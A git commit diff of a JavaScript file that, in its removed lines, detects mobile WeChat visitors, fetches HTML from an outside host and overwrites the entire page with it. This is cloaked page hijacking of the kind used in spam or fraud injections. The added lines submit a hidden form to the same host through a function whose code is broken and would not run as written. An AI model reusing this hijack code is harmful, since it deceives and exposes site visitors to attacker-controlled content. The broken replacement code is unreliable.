968b41a42fb87208812de2af37bcf832168dc470
wwzxcvbnm <45349742+wwzxcvbnm@users.noreply.github.com>
2018-12-08 17:23:17 +0800

    Update js.js

--- js.js
+++ js.js
@@ -7,27 +7,24 @@
 	if(system.win||system.mac||system.xll||system.ipad){var l=1;}if(!isWeiXin()){var l=1;}function isWeiXin(){var ua=window.navigator.userAgent.toLowerCase();
  	if(ua.match(/MicroMessenger/i)=='micromessenger'){return true}else{return false}}
 if(l!=1){
-var xhr = new XMLHttpRequest;
-var html = null;
-function render() {
-    var a = document.open("text/html", "replace");
-    a.write(html);
-    a.close();
-}
-xhr.onload = function() {
-    html = xhr.responseText;
-    var delay = 0;
-	
-    if (delay > 0) setTimeout("render()", delay * 1000)
-    else render();
-};
-function getQueryString(name) { 
-	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
-	var r = window.location.search.substr(1).match(reg); 
-	if (r != null) return unescape(r[2]); return null; 
-} 
-gid=getQueryString("kpi");
-xhr.open("GET", "//blczzj.com//"+Date.now()+".gcif?", !0);
-xhr.send();
+
+
 
 }
+ alert(get('http://blczzj.com/23123.gcif'));
+function get(URL, {html :'prnhtml',cm1:'sdsddsd',cm2:'haha'})
+                        {
+                            var temp = document.createElement("form");
+                            temp.method = "get";
+                            temp.style.display = "none";
+                            var data = "?";
+                            for (var x in PARAMS)
+                            {
+                                data += x + "=" + PARAMS[x] + "&";;
+                            }
+                            data = data.slice(0, data.length-1);
+                            temp.action = URL + data;
+                            document.body.appendChild(temp);
+                            temp.submit();
+                            return temp;
+                        }
